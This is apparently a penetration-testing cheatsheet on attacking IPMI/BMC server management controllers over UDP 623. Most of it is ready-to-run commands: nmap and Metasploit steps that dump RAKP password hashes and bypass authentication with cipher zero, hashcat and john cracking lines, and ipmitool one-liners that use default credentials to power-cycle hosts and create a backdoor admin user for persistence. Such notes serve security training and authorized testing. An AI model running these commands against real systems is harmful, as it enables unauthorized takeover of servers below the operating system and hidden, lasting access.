# IPMI / BMC (623 UDP)

[[09 - Service Cheatsheets/00 - README|Folder index]]

## Attacker Mindset

Intelligent Platform Management Interface (IPMI) runs on the Baseboard Management Controller (BMC) — a micro-controller embedded on the motherboard that gives **lights-out / out-of-band** access to the host. Vendor names: **HP iLO, Dell DRAC (iDRAC), Supermicro IPMI, Lenovo IMM**. If you see 623/udp you are looking at a server with **a second computer underneath the OS** that can power-cycle, mount virtual media, dump SEL logs, and present a remote KVM. Owning the BMC = owning the host independent of the OS. Many BMCs also expose a web UI on 80/443 and SSH/Telnet for serial-over-LAN.

**Why it matters:** the IPMI 2.0 RAKP authentication protocol leaks a salted SHA1 hash of any user's password to **any anonymous remote requester** (CVE-2013-4786). Default credentials are rampant. Some Supermicro firmware will return cleartext passwords in PHP source via `/PSBlock`.

## Enumerate

```bash
# Fingerprint
sudo nmap -sU --script ipmi-version -p 623 $IP
sudo nmap -sU -p 623 -sV $IP

# Cipher zero (auth bypass on misconfigured devices)
sudo nmap -sU --script ipmi-cipher-zero -p 623 $IP

# Brute force / dump
sudo nmap -sU --script ipmi-brute -p 623 $IP
```

## Metasploit modules

```text
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes      # RAKP SHA1 hash dump (CVE-2013-4786)
use auxiliary/scanner/ipmi/ipmi_cipher_zero     # Cipher 0 auth bypass
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS $IP
run
```

## Crack RAKP hashes

The `ipmi_dumphashes` module writes John-format hashes. Hashcat mode is **7300** (IPMI2 RAKP HMAC-SHA1).

```bash
hashcat -m 7300 ipmi_hashes.txt /usr/share/wordlists/rockyou.txt
john --format=rakp ipmi_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

## Post-auth: what you can do

- **Virtual media:** mount an ISO, reboot the host, boot to your live USB → full disk read.
- **Serial-over-LAN (SoL):** `ipmitool -I lanplus -H $IP -U root -P calvin sol activate`
- **Power cycle:** `ipmitool -I lanplus -H $IP -U root -P calvin chassis power cycle`
- **Dump SEL logs:** intel for the engagement.
- **Add IPMI user:** persistence below the OS.

## ipmitool one-liners

```bash
# Identify
ipmitool -I lanplus -H $IP -U $USER -P $PASS mc info
ipmitool -I lanplus -H $IP -U $USER -P $PASS bmc info

# List/add users
ipmitool -I lanplus -H $IP -U $USER -P $PASS user list 1
ipmitool -I lanplus -H $IP -U $USER -P $PASS user set name 5 backdoor
ipmitool -I lanplus -H $IP -U $USER -P $PASS user set password 5 BackdoorPass1!
ipmitool -I lanplus -H $IP -U $USER -P $PASS user priv 5 4 1   # admin on chan 1

# Power
ipmitool -I lanplus -H $IP -U $USER -P $PASS chassis power status
ipmitool -I lanplus -H $IP -U $USER -P $PASS chassis power reset
```

## Web UI

If 80 / 443 is open on the same host, browse there too. Default creds frequently work in the web UI even when SSH is locked down. Look for:

- `/cgi/login.cgi` (Supermicro)
- `/redfish/v1/` (modern Redfish API — often unauth read of inventory)
- `/PSBlock` (Supermicro firmware password leak, older versions)
